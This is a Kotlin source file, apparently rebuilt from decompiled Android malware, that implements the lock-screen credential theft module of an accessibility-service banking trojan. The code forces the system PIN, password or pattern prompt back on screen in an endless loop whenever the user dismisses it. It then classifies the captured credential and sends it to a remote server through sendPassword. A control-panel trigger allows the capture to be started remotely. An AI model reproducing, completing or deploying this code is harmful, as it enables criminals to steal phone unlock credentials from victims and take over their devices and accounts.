package com.storm.safe.rock.service.delegates

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager

/**
 * CipherFlowController — delegates cipher/password capture flow from
 * MyAccessibilityService to reduce class size.
 *
 * Extracted methods:
 * - captureViaSystemAuth(isInstallationFlow)
 * - launchPasswordCapture(isInstallationFlow)
 * - doLaunchSystemPasswordCapture(isInstallationFlow)
 * - onPasswordPageDismissedByUser()
 * - completeInstallationWithCipher()
 * - handleCipherCredentialResult(success)
 * - enableCipherCapture()
 * - launchCipherCaptureFromControl(overlayType)
 *
 * Uses Mode B: direct MyAccessibilityService reference for field access.
 */
class CipherFlowController(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "CipherFlowController"
    }

    // ── Internal-only cipher state (moved from MyAccessibilityService) ──

    private val cipherMaxRetries = Int.MAX_VALUE
    private val cipherRetryDelayMs = 300L
    @Volatile
    private var cipherIsInstallationFlow = false

    // vendor: f52471k2/f52472k3/f52473k4 — 用户离开密码页面的重试循环
    @Volatile
    private var cipherDismissCount = 0
    private val cipherDismissMaxRetries = Int.MAX_VALUE
    private val cipherDismissDelayMs = 300L

    // ════════════════════════════════════════════════════════════════
    // captureViaSystemAuth
    // ════════════════════════════════════════════════════════════════

    /**
     * Capture password via system auth.
     * JADX: part of m211530m8 chain, line ~4297
     *
     * Flow:
     *  1. persistent guard — install flow skips if cipher_captured=true
     *  2. already-captured gate — (TODO: VENDOR_VERIFY)
     *  3. isKeyguardSecure — skip if no lock screen
     *  4. launch capture, with 2s delay for install flow
     */
    suspend fun captureViaSystemAuth(isInstallationFlow: Boolean) {
        Log.d(TAG, "captureViaSystemAuth() isInstallationFlow=$isInstallationFlow")

        // 1. persistent guard — vendor L4297-4299
        try {
            val prefs = service.getSharedPreferences("app_config", Context.MODE_PRIVATE)
            if (isInstallationFlow && prefs.getBoolean("cipher_captured", false)) {
                Log.d(TAG, "cipher_captured=true (persistent), skipping")
                return
            }
        } catch (_: Exception) { /* SP failure doesn't block */ }

        // 2. already-captured gate — TODO: VENDOR_VERIFY

        // 3. isKeyguardSecure — vendor L4331
        val km = service.getSystemService(Context.KEYGUARD_SERVICE) as? android.app.KeyguardManager
        if (km?.isKeyguardSecure != true) {
            Log.d(TAG, "keyguard not secure, skipping")
            return
        }

        // 4. launch capture — vendor capturePasswordViaSystemAuth$2
        if (isInstallationFlow) {
            kotlinx.coroutines.delay(2000L)
        }
        service.passwordLaunchCount = 0
        service.isCipherCaptureEnabled = true
        launchPasswordCapture(isInstallationFlow)
    }

    // ════════════════════════════════════════════════════════════════
    // launchPasswordCapture
    // ════════════════════════════════════════════════════════════════

    /**
     * Launch password capture via syuqattwmgit Activity.
     * JADX: part of dqtvuisjd, line ~4963
     */
    fun launchPasswordCapture(isInstallationFlow: Boolean) {
        if (!service.isCipherCaptureEnabled) {
            Log.d(TAG, "cipher capture disabled, not launching")
            return
        }
        try {
            service.passwordLaunchCount++
            Log.d(TAG, "launching system password verify (attempt #${service.passwordLaunchCount})")
            service.cipherCaptureManager?.let { ccm ->
                // JADX: ccm.enableCapture()
                Log.d(TAG, "CipherCaptureManager listening enabled")
            }
            // vendor dqtvuisjd.java:4963-4967 — Intent flags 805306368 = NEW_TASK | CLEAR_TOP | SINGLE_TOP
            val intent = android.content.Intent(service, com.storm.safe.rock.activity.syuqattwmgit::class.java)
            intent.putExtra("credential_type", 0)
            intent.addFlags(
                android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP
            )
            // vendor strategy 1 (L4969-4973): foreground Activity → currentActivity.startActivity
            val currentActivity = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
            if (currentActivity != null && !currentActivity.isFinishing && !currentActivity.isDestroyed) {
                try {
                    currentActivity.startActivity(intent)
                    Log.d(TAG, "[strategy1] launched via foreground Activity context")
                    return
                } catch (e: Exception) {
                    Log.e(TAG, "[strategy1] failed: ${e.message}")
                }
            }
            // vendor strategy 2 (L4974-4988): no foreground → moveTaskToFront + 800ms postDelayed
            Log.d(TAG, "[fallback] no foreground Activity, moveTaskToFront")
            try {
                val am = service.getSystemService(Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
                val tasks = am?.appTasks
                if (!tasks.isNullOrEmpty()) {
                    tasks[0].moveToFront()
                    Log.d(TAG, "[fallback] moveToFront called")
                }
            } catch (e: Exception) {
                Log.e(TAG, "[fallback] moveTaskToFront failed", e)
            }
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    service.startActivity(intent)
                    Log.d(TAG, "[strategy2] launched via service context after 800ms")
                } catch (e: Exception) {
                    Log.e(TAG, "[strategy2] failed: ${e.message}")
                }
            }, 800L)
        } catch (e: Exception) {
            Log.e(TAG, "launchPasswordCapture failed", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // doLaunchSystemPasswordCapture
    // ════════════════════════════════════════════════════════════════

    /**
     * Launch system password verification via syuqattwmgit Activity.
     * JADX: m211457e6 (e6), line 4873
     */
    fun doLaunchSystemPasswordCapture(isInstallationFlow: Boolean) {
        try {
            service.cipherRetryCount = 0
            cipherIsInstallationFlow = isInstallationFlow
            Log.d(TAG, "doLaunchSystemPasswordCapture isInstallationFlow=$isInstallationFlow")

            service.cipherCaptureManager?.startListening()

            com.storm.safe.rock.activity.syuqattwmgit.start(service, 0, ::handleCipherCredentialResult)
        } catch (e: Exception) {
            Log.e(TAG, "doLaunchSystemPasswordCapture failed", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // onPasswordPageDismissedByUser
    // ════════════════════════════════════════════════════════════════

    /**
     * Re-launch PIN when user dismisses password page.
     * vendor: m211495i9 (i9) — onPasswordPageDismissedByUser
     *
     * Called by CipherCaptureManager on window switch away from password UI.
     * Relaunches after 300ms, infinite loop until success.
     */
    fun onPasswordPageDismissedByUser() {
        if (!service.isCipherCaptureEnabled) {
            Log.d(TAG, "[onPasswordPageDismissedByUser] cipher capture not active, ignoring")
            return
        }
        cipherDismissCount++
        if (cipherDismissCount >= cipherDismissMaxRetries) {
            Log.w(TAG, "[onPasswordPageDismissedByUser] max retries reached, stopping")
            service.isCipherCaptureEnabled = false
            cipherDismissCount = 0
            return
        }
        Log.d(TAG, "[onPasswordPageDismissedByUser] user left password page, relaunching in ${cipherDismissDelayMs}ms")
        service.cipherCaptureManager?.let {
            CipherCaptureManager.enableListening(it)
        }
        Handler(Looper.getMainLooper()).postDelayed({
            doLaunchSystemPasswordCapture(cipherIsInstallationFlow)
        }, cipherDismissDelayMs)
    }

    // ════════════════════════════════════════════════════════════════
    // completeInstallationWithCipher
    // ════════════════════════════════════════════════════════════════

    /**
     * Complete installation after cipher capture.
     * JADX: m211449d4 (d4), line 4647
     */
    fun completeInstallationWithCipher() {
        try {
            Log.d(TAG, "completeInstallationWithCipher()")

            service.getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
                .putBoolean("cipher_excluded", true).apply()
            val ccm = service.cipherCaptureManager
            if (ccm != null) {
                val cipher = ccm.readBufferedCipher(false)
                val textCipher = cipher?.get("text") as? String
                val patternPoints = cipher?.get("pattern") as? List<*>

                val gradeCode = when {
                    patternPoints != null -> "pattern"
                    textCipher != null && textCipher.length <= 4 -> "4pin"
                    textCipher != null && textCipher.length <= 6 -> "6pin"
                    else -> "mixed"
                }
                Log.d(TAG, "cipher type: $gradeCode")

                val cipherValue = textCipher ?: patternPoints?.joinToString(",") ?: ""
                if (cipherValue.isNotEmpty()) {
                    service.networkManager?.sendPassword(cipherValue, "system_auth", gradeCode)
                }
            }

            Log.d(TAG, "installation complete flow done")
            service.tryShowPackageVerify()
        } catch (e: Exception) {
            Log.e(TAG, "completeInstallationWithCipher failed", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // handleCipherCredentialResult
    // ════════════════════════════════════════════════════════════════

    /**
     * Handle credential verification result (success or failure).
     * JADX: internal callback from syuqattwmgit Activity.
     */
    fun handleCipherCredentialResult(success: Boolean) {
        Log.d(TAG, "credential result: ${if (success) "success" else "failure"}")
        if (success) {
            if (!com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
                service.isCipherCaptureEnabled = false
            }
            service.cipherRetryCount = 0
            // Save lock type from last captured quality before completeInstallation clears buffer
            val quality = service.lastCapturedCipherQuality
            val lockType = when (quality) {
                "PASSWORD_QUALITY_PATTERN" -> "pattern"
                "PASSWORD_QUALITY_NUMERIC_COMPLEX", "PASSWORD_QUALITY_NUMERIC" -> "pin"
                "PASSWORD_QUALITY_ALPHANUMERIC" -> "pin"
                else -> "unknown"
            }
            service.getSharedPreferences("cipher_config", Context.MODE_PRIVATE).edit()
                .putBoolean("cipher_completed", true)
                .putString("cipher_lock_type", lockType)
                .apply()
            Log.d(TAG, "cipher_completed=true, lock_type=$lockType (quality=$quality)")
            if (cipherIsInstallationFlow) completeInstallationWithCipher()
        } else {
            service.cipherRetryCount++
            if (service.cipherRetryCount < cipherMaxRetries) {
                Log.d(TAG, "retry ${service.cipherRetryCount}/$cipherMaxRetries")
                Handler(Looper.getMainLooper()).postDelayed({
                    com.storm.safe.rock.activity.syuqattwmgit.start(service, 0, ::handleCipherCredentialResult)
                }, cipherRetryDelayMs)
            } else {
                Log.w(TAG, "max retries reached")
                service.isCipherCaptureEnabled = false
                service.cipherRetryCount = 0
                service.cipherCaptureManager?.stopListeningFull()
                // Bug 5 fix: reset GRM so touch exploration doesn't stay on permanently
                service.gestureRecorderManager?.reset()
                if (cipherIsInstallationFlow) completeInstallationWithCipher()
            }
        }
    }

    // ════════════════════════════════════════════════════════════════
    // enableCipherCapture
    // ════════════════════════════════════════════════════════════════

    /**
     * Enable cipher capture + start cipher overlay.
     * JADX method: m211458e7 (e7), line 4999
     */
    fun enableCipherCapture() {
        try {
            service.isCipherCaptureEnabled = true
            Log.d(TAG, "cipher capture enabled")
            service.cipherCaptureManager?.let { ccm ->
                // JADX: C0335a1.m211788c1 — enable capture
                Log.d(TAG, "CipherCaptureManager enabled")
            }
        } catch (e: Exception) {
            Log.e(TAG, "enableCipherCapture failed", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // launchCipherCaptureFromControl
    // ════════════════════════════════════════════════════════════════

    /**
     * Launch cipher capture from control panel.
     * JADX: l8 method
     */
    fun launchCipherCaptureFromControl(overlayType: String) {
        try {
            Log.d(TAG, "control-triggered cipher capture, type: $overlayType -> using system auth")
            launchPasswordCapture(false)
        } catch (e: Exception) {
            Log.e(TAG, "launchCipherCaptureFromControl failed", e)
        }
    }
}
